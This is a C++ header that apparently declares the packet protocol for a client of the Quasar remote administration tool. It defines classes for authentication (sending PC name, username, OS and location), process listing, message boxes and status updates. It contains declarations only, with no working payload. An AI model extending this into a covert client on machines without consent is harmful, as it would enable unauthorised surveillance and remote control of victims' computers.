#pragma once
#include "membuf.h"
#include "boost/shared_ptr.hpp"
#include <vector>
#include "../serializer.h"
#include "../deserializer.h"
#include <map>

enum QuasarPacketId {
	PACKET_UNKNOWN = 0,
	PACKET_GET_AUTHENTICATION = 106,
	PACKET_GET_AUTHENTICATION_RESPONSE = 56,
	PACKET_GET_PROCESSES = 97,
	PACKET_GET_PROCESSES_RESPONSE = 49,
	PACKET_DO_SHOW_MESSAGEBOX = 85,
	PACKET_SET_STATUS = 55
};

class quasar_packet {
public:
	virtual ~quasar_packet() {
	}

	quasar_packet();
	quasar_packet(QuasarPacketId id);

	QuasarPacketId get_id() const;

	virtual std::vector<char> serialize_packet() = 0;
	virtual void deserialize_packet(memstream &stream) = 0;

	static bool is_unknown(const quasar_packet &packet) {
		return packet.get_id() == PACKET_UNKNOWN;
	}

	static bool is_unknown(const boost::shared_ptr<quasar_packet> packet) {
		return packet == nullptr || packet->get_id() == PACKET_UNKNOWN;
	}

protected:
	quasar_serializer m_serializer;
	quasar_deserializer m_deserializer;

	// must be called at start of serialize functions
	void begin_serialization();
	// must be called at the end of serialize functions
	void finalize_serialization();

private:
	QuasarPacketId m_id;

	void write_header(std::vector<char> &payloadBuf) const;
};

class get_authentication_packet : public quasar_packet {
public:
	get_authentication_packet();

	std::vector<char> serialize_packet() override;
	void deserialize_packet(memstream &stream) override;
};

class get_authentication_response_packet : public quasar_packet {
public:
	get_authentication_response_packet();

	std::vector<char> serialize_packet() override;
	void deserialize_packet(memstream &stream) override;

private:
	std::string m_account_type;
	std::string m_city;
	std::string m_country;
	std::string m_country_code;
	std::string m_id;
	std::string m_os;
	int32_t m_img_idx;
	std::string m_pcname;
	std::string m_region;
	std::string m_tag;
	std::string m_username;
	std::string m_ver;

	void initialize_values();
};

class get_processes_packet : public quasar_packet {
public:
	get_processes_packet();

	std::vector<char> serialize_packet() override;
	void deserialize_packet(memstream &stream) override;
};

class get_processes_response_packet : public quasar_packet {
public:
	get_processes_response_packet();

	std::vector<char> serialize_packet() override;
	void deserialize_packet(memstream &stream) override;

private:
	std::vector<int> m_pids;
	std::vector<std::string> m_proc_names;
	std::vector<std::string> m_wnd_titles;
};

class do_show_message_box_packet : public quasar_packet {
public:
	do_show_message_box_packet();

	std::vector<char> serialize_packet() override;
	void deserialize_packet(memstream &stream) override;

	std::string get_caption() const;
	std::string get_text() const;
	std::string get_btn() const;
	std::string get_icon() const;

	static uint32_t get_button_value(const std::string &val);
	static uint32_t get_icon_value(const std::string &val);

private:
	std::string m_caption;
	std::string m_text;
	std::string m_btn;
	std::string m_icon;
};

class set_status_packet : public quasar_packet {
public:
	set_status_packet();
	set_status_packet(std::string status);

	void set_status(std::string value);

	std::vector<char> serialize_packet() override;
	void deserialize_packet(memstream &stream) override;

private:
	std::string m_status;
};